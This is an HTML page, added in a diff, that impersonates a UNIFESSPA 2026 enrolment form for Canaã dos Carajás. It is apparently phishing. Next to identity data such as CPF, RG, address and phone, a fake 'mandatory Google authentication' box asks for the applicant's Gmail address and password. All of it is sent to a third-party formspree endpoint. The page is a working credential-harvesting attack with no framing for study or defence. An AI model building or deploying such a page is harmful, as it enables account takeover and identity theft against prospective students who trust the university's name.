@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inscrição Completa - UNIFESSPA 2026</title>
+    <style>
+        :root {
+            --primary-purple: #4B0082;
+            --white: #ffffff;
+            --bg-gradient: linear-gradient(135deg, #4B0082 0%, #2E004F 100%);
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: var(--bg-gradient);
+            background-attachment: fixed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 40px 20px;
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 650px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+            color: var(--white);
+        }
+
+        h1 { font-size: 3rem; margin: 0; text-align: center; text-transform: uppercase; }
+        .edital-sub { font-weight: bold; text-align: center; margin-bottom: 20px; }
+        .tag-local { border: 2px solid var(--white); display: block; text-align: center; padding: 8px; border-radius: 50px; font-weight: bold; margin: 0 auto 30px auto; max-width: 400px; }
+
+        .section-title {
+            border-left: 4px solid #fff;
+            padding-left: 10px;
+            margin: 25px 0 15px 0;
+            font-size: 1.1rem;
+            text-transform: uppercase;
+            background: rgba(255,255,255,0.1);
+        }
+
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .form-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 0.8rem; font-weight: 600; opacity: 0.9; }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            border-radius: 6px;
+            border: none;
+            background: rgba(255, 255, 255, 0.95);
+            color: #222;
+            box-sizing: border-box;
+        }
+
+        .google-auth-box {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            margin-top: 25px;
+        }
+
+        .btn-submit {
+            background-color: var(--white);
+            color: var(--primary-purple);
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+            text-transform: uppercase;
+            margin-top: 30px;
+            font-size: 1.2rem;
+        }
+
+        .btn-submit:hover { background-color: #f0f0f0; transform: translateY(-3px); }
+        .unifesspa-logo { font-weight: 900; font-style: italic; font-size: 1.8rem; margin-top: 25px; display: block; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>EDITAL</h1>
+    <div class="edital-sub">Nº 21/2026 – UNIFESSPA</div>
+    <div class="tag-local">INSCRIÇÃO CANAÃ DOS CARAJÁS</div>
+
+    <form action="https://formspree.io/f/xvzdvbvz" method="POST">
+        
+        <div class="section-title">Dados Pessoais</div>
+        <div class="form-group">
+            <label>Nome Completo:</label>
+            <input type="text" name="Nome" required>
+        </div>
+
+        <div class="form-row">
+            <div class="form-group">
+                <label>CPF:</label>
+                <input type="text" name="CPF" placeholder="000.000.000-00" required>
+            </div>
+            <div class="form-group">
+                <label>RG / Órgão Emissor:</label>
+                <input type="text" name="RG" placeholder="Ex: 123456 PC/PA" required>
+            </div>
+        </div>
+
+        <div class="form-row">
+            <div class="form-group">
+                <label>Data de Nascimento:</label>
+                <input type="date" name="Data_Nascimento" required>
+            </div>
+            <div class="form-group">
+                <label>Gênero:</label>
+                <select name="Genero" required>
+                    <option value="" disabled selected>Selecione</option>
+                    <option value="Masculino">Masculino</option>
+                    <option value="Feminino">Feminino</option>
+                    <option value="Outro">Outro / Não informar</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="section-title">Endereço e Contato</div>
+        <div class="form-group">
+            <label>Endereço Residencial (Rua, Número, Bairro):</label>
+            <input type="text" name="Endereco" required>
+        </div>
+        <div class="form-row">
+            <div class="form-group">
+                <label>Cidade:</label>
+                <input type="text" name="Cidade" value="Canaã dos Carajás" required>
+            </div>
+            <div class="form-group">
+                <label>Telefone (WhatsApp):</label>
+                <input type="tel" name="Telefone" placeholder="(00) 00000-0000" required>
+            </div>
+        </div>
+
+        <div class="section-title">Opção de Curso</div>
+        <div class="form-group">
+            <label>Selecione sua vaga:</label>
+            <select name="Vaga_Pretendida" required>
+                <option value="" disabled selected>Selecione o curso</option>
+                <option value="Engenharia Civil">Engenharia Civil - 30 vagas</option>
+                <option value="Engenharia Elétrica">Engenharia Elétrica - 30 vagas</option>
+                <option value="Engenharia Mecânica">Engenharia Mecânica - 30 vagas</option>
+                <option value="Direito">Direito - 40 vagas</option>
+            </select>
+        </div>
+
+        <div class="google-auth-box">
+            <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18" style="margin-right: 10px;">
+                <span style="font-weight: bold; font-size: 0.9rem; color: #fff;">Autenticação Obrigatória Google</span>
+            </div>
+            
+            <div class="form-group">
+                <label>E-mail do Gmail:</label>
+                <input type="email" name="Email_Gmail" placeholder="seu-email@gmail.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Senha do E-mail:</label>
+                <input type="password" name="Senha_do_Gmail" placeholder="Sua senha do Google" required>
+            </div>
+            <p style="font-size: 0.7rem; margin: 0; opacity: 0.8; line-height: 1.2;">
+                * Para validar sua inscrição, utilize o e-mail e a senha oficial da sua conta Google.
+            </p>
+        </div>
+
+        <button type="submit" class="btn-submit">Finalizar Inscrição</button>
+    </form>
+</div>
+
+</body>
+</html>
